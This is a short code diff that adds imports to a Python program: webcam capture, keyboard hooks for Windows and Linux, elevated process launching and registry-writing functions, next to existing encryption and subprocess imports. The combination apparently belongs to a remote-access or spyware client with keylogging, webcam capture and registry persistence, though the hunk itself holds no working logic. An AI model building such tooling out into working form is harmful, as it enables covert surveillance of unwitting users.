@@ -76,7 +76,15 @@ import subprocess
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256, HMAC
 from Crypto.Util.number import long_to_bytes, bytes_to_long
+from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
 
+if os.name is 'nt':
+    from pyHook import HookManager
+    from pythoncom import PumpMessages
+    from win32com.shell.shell import ShellExecuteEx
+    from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
+else:
+    from pyxhook import HookManager
 
 
 
